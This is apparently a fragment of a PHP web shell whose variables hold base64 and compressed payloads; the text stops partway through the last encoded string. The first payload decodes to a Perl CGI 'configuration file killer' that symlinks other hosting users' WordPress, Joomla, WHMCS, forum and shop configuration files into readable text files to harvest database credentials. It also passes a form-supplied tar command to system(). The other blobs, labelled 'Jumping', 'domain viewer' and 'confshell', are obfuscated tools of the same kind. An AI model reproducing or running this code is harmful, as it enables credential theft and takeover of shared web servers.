$gantengers="IyEvdXNyL2Jpbi9tYW5udSAtSS91c3IvbG9jYWwvYmFuZG1pbg0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+DQo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtTGFuZ3VhZ2UiIGNvbnRlbnQ9ImVuLXVzIiAvPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KLmR6IHsNCmZvbnQtZmFtaWx5OiBUYWhvbWE7DQpmb250LXNpemU6IDE0cHg7DQpmb250LXdlaWdodDogYm9sZDsNCmNvbG9yOiAjMzMzM2ZmOw0KdGV4dC1hbGlnbjogY2VudGVyOw0KdGV4dC1zaGFkb3c6IGJsYWNrIDBweCAwcHggMnB4Ow0KfQ0KI2NoZWNrb3V0dGV4dGFyZWEgew0KDQp3ZWJraXQtYm9yZGVyLXJhZGl1czogMTVweDsNCg0KfQ0KOmhvdmVyI2NoZWNrb3V0dGV4dGFyZWEge29wYWNpdHk6IDAuNjsgYmFja2dyb3VuZC1jb2xvcjozMzMzMzN9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQooJHVzZXIpID0gQF87DQokbXNyID0gcXh7cHdkfTsNCiRrb2xhPSRtc3IuIi8iLiR1c2VyOw0KJGtvbGE9fnMvXG4vL2c7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1zaG9wLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29zL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2hvcC1vcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1vc2NvbW1lcmNlLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictb3Njb21tZXJjZXMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2hvcC1zaG9wcGluZy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2FsZS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywka29sYS4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRrb2xhLictYW1lbWJlcjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1tZW1iZXJzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLictMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLWZvcnVtcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGtvbGEuJy01LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRrb2xhLictNC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLXdwLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1dQL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy1XUC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy13cC1iZXRhLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLWJldGEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy13b3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtbmV3LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cC1ibG9nLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cC1iZXRhLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtYmxvZ3MudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywka29sYS4nLXdwLWhvbWUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtcHJvdGFsLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cC1zaXRlLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cC1tYWluLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cC10ZXN0LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGtvbGEuJy02LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nLTcudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29ubmVjdC5waHAnLCRrb2xhLictOC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJGtvbGEuJy05LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvY29uZmlnLnBocCcsJGtvbGEuJy0xMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tbGEtY21zLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tbGEtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLWhvbWUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy12Yi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy12YjMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy1pbmNsdWRlcy12Yi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htMTUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2VudHJhbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9XSE1DUy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tV0hNQ1MudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9XSE0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htY3MudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHAvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VjdXJlLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VjdXJlLXdobS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jcGFuZWwudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictcGFuZWwudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1ob3N0cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGtvbGEuJy13aG1jczIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnRzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY2xpZW50ZXMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htLW1hbmFnZS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tbXkudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobS1teXNob3AudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywka29sYS4nLXplbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRrb2xhLictc2hvcC16ZW5jYXJ0LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywka29sYS4nLXNob3AtWkNzaG9wLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGtvbGEuJy1zbWYudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGtvbGEuJy1zbWYyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGtvbGEuJy1zbWYtZm9ydW0udHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGtvbGEuJy1zbWYtZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLXVwLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdXAyLnR4dCcpOw0KfQ0KaWYgKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgJ1BPU1QnKSB7DQpyZWFkKFNURElOLCAkYnVmZmVyLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCn0gZWxzZSB7DQokYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQooJG5hbWUsICR2YWx1ZSkgPSBzcGxpdCgvPS8sICRwYWlyKTsNCiRuYW1lID1+IHRyLysvIC87DQokbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KJHZhbHVlID1+IHRyLysvIC87DQokdmFsdWUgPX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0pL3BhY2soIkMiLCBoZXgoJDEpKS9lZzsNCiRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0iZHoiIGJnY29sb3I9ImJsYWNrIj4NCjxwPjxmb250IGNvbG9yPXdoaXRlPmNvbmZpZ3VyYXRpb24gZmlsZSBraWxsZXI8L3A+DQoNCjxzcGFuPjxmb250IGNvbG9yPSJ3aGl0ZSI+c3VwcGx5IHVzZXJuYW1lcyB0byBzeW1saW5rIGNvbmZpZ3VyYXRpb24gZmlsZXM8L2ZvbnQ+PC9zcGFuPjxiciAvPg0KPGJyIC8+PGZvcm0gbWV0aG9kPSJwb3N0Ij48c3Ryb25nPg0KPHRleHRhcmVhIGlkPSJjaGVja291dHRleHRhcmVhIiBuYW1lPSJwYXNzIiBzdHlsZT0iYm9yZGVyOjJweCBkYXNoZWQgcmVkOyB3aWR0aDogMzAwcHg7IGhlaWdodDogMjAwcHg7IGJhY2tncm91bmQtY29sb3I6YmxhY2s7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjlwdDsgY29sb3I6IHJlZCIgPjwvdGV4dGFyZWE+PGJyIC8+DQombmJzcDsNCjxwPg0KPGlucHV0IG5hbWU9IlN1Ym1pdDEiIHR5cGU9InN1Ym1pdCIgdmFsdWU9InNwaW4gaXQgOC0pIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwRkZGRjsgd2lkdGg6IDk5OyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjogYmxhY2s7IHRleHQtdHJhbnNmb3JtOnVwcGVyY2FzZTsgaGVpZ2h0OjIzOyBiYWNrZ3JvdW5kLWNvbG9yOiNGNEY0RjQ7IiAvPjwvcD4NCjwvZm9ybT48L3N0cm9uZz4NCic7DQp9ZWxzZXsNCkBsaW5lcyA9PCRGT1JNe3Bhc3N9PjsNCiR5ID0gQGxpbmVzOw0Kb3BlbiAoTVlGSUxFLCAiPnRhci50bXAiKTsNCnByaW50IE1ZRklMRSAidGFyIC1jemYgIi4kRk9STXt0YXJ9LiIudGFyICI7DQpmb3IgKCRrYT0wOyRrYTwkeTska2ErKyl7DQp3aGlsZShAbGluZXNbJGthXSA9fiBtLyguKj8pOng6L2cpew0KJmxpbCgkMSk7DQpwcmludCBNWUZJTEUgJDEuIi50eHQgIjsNCmZvcigka2Q9MTska2Q8MTg7JGtkKyspew0KcHJpbnQgTVlGSUxFICQxLiRrZC4iLnR4dCAiOw0KfQ0KfQ0KfQ0KcHJpbnQnPGJvZHkgY2xhc3M9ImR6IiBiZ2NvbG9yPSJibGFjayI+DQo8aDI+ZG9uZSA8L2gyPg0KPHA+Jm5ic3A7PC9wPic7DQppZigkRk9STXt0YXJ9IG5lICIiKXsNCm9wZW4oSU5GTywgInRhci50bXAiKTsNCkBsaW5lcyA9PElORk8+IDsNCmNsb3NlKElORk8pOw0Kc3lzdGVtKEBsaW5lcyk7DQpwcmludCc8cD48YSBocmVmPSInLiRGT1JNe3Rhcn0uJy50YXIiPjxmb250IGNvbG9yPSIjMDBGRjAwIj4NCjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiPjwvc3Bhbj48L2ZvbnQ+PC9hPjwvcD4nOw0KfQ0KfQ0KcHJpbnQiDQo8L2JvZHk+DQo8L2h0bWw+";
//Jumping
$jumper="zVPdbtMwFL6ftHc4tSLZ0dKmwF2bpEgILkFar2CbghPbxCiJI9thK9MeiLfkOFnLygXXKErkfj/n15V1Y4BknlethLrlzuW3pO5EZR5uSZF5i6+A2rRu4D1SrxElW7i8YJHrIAfd6/Kb9Iw6rmTZGSFpDHkO6xh2qJpF1ChFNyC0ZOS9tcZuYH+UI/2pz1IvCvzY8AmlFJcXmdA/ThXpXhnMvB8t7/bNm7bNUqQL+Ev2nR84yuCL6Sotl9fGePgFZCW4l4x+ponXnWRxvCIIRg8feSfxuF3GMMcjcWjNSV8GYdnqTnu2RvBtNGCGe4HVKjPIntFU+jqdQZpQSyenVsAWz9IYHkPHwMjN8g6mtmED78wo+q8eriUX8CLG/zSBp7C4YaywWW4tPzDEotFJ686Q2vTqDND4a72F+0a3ki2UNIodZxE/TpfB2zBAvC/uxGwhDA29Bbxar1EXDSbkQS0eWPAkdDOPdyqix5IDP1ZIzfw6CaZQgtD2Z7hwaWM6mdLVybGiKXbU6rpsfNem9Lgt9ifmAn00VBpw7UqLKwqbYFPUQEytlsPomtnmkpMbk79kMVcy28I4wxPpq6twVgbj1g08RwDu5tlOE5Lh30hvPpixF7C4g4xDY6XKye6Qn7V03g4p/kGmWcqLrLIFnTe7K34D";
//domain viewer
$private="y8kvS1WozC9VCE7MKc5IVLDSAgA=";
$zonekerupuk="rVVtb9s2EP5uwP/hqgWRDTiWnWRrIcvChjUFhmZJYbtfNhcGLZ8sIhQpUFRtt8h/31EvsfPidgVKwBB5R94999xDGqNEOe1WkJudwLDdMrg1TCODr+2Wxpx/QV8qiaN2K1JCaR9+GZQDyLJk0d1aq0Kuzipn7RsBtFuxkuasPP8mMyOoN8TlsGeVXqH2h9kWciX4CjYJNwgPnjOBsfHh8rl/w1cm8X+9vMi2tEqQrxPjXw4G5fK+3eIyK4yF/xjwT8F7HNXxeghS4DX0BhFKgzoMYqVTSNEkajWeOx9up7O5Q/6/udZKg287ggIjA+XJsfukmKOlfLOMbxdxrITaXhutu3S4IFmKBD4tMZfwA5UZrmT4hSRzlgRevSwZKMsJg6Wm5Y0yPEYNNxTBh6BqmdllNpxV4NyBTLAIEyUoNRnfoy6y4o7sddIVxuSnrGCLJcPFOSGoor9VKeMyB98ugwdFV0zOnUpA8NvrNyQZqAUEF4NzWh4kqILYoF4Too7/GG9eLFNuEX9morCGKcrVPs5aVcx4tuN2YjHRzyFpkOxyNAvDU1wITlGgM+iSncfQeRUXMrLsLXDLc5NDx4kKLRZccuN0u19XHMk0S3gO00jzzECRYw7Rx8k1XPOlZnrXg50qIC1yA1SJYUJAzDWtXpUgGCQa47GbGJP5nseK836WZH2JxkuZLJjwUHo2Z59AFpl1uuEPbA48Fjrd0X1Zpy3p95OFFfq/7lq5n7rtFt1RqAeRgyxKoIPbTKiVLW0unR40J+pu0DFgOZxUy+7+/EGoZmSKKu3UWw8iVcJxP+1NlYAp9mgf5X4/RXoiwWn6RrSRFtZoxu5iKZi8cx/TWEm/H6nUYzpK+Gf0smIpeJ7gajxww3/qq8EeVFAR1LS7wU1UEsIaLc0qkI9ZOyHGxvAgC+gcVlCaqRl0BylclPTgT9LG7YfZYnI1+zi5mU3+uJm+u5r0YPj/jlmyms37/fmGG9u4PcAXehKxHMGpqHFGz3t1PCl9euDU3G42m/4Bv9K+Ijsv53It0On+UFxbzLu/rq7fTil8zfK4ofu0Es1wbLtwmtBbm5Imx8NTEmmu5Hj4YjIr8UzjepGykhHHK19fegM00oMQ3r4P5p59n0P6Ch56pO8SIG4xKuF1u93nYZ/IsL61Tt+x4OjTyJGmlSBpEgZ5xuST/461RpRuaI8BYfHslvBQiM8yihy/i+eFRFRunebKSqLJdCTLkki9O7DbHhTC+N/fef9EtZFQJLOSSHut/gM=";
//confshell
$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPlByaXY4IFNDUjwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KLm5ld1N0eWxlMSB7DQogZm9udC1mYW1pb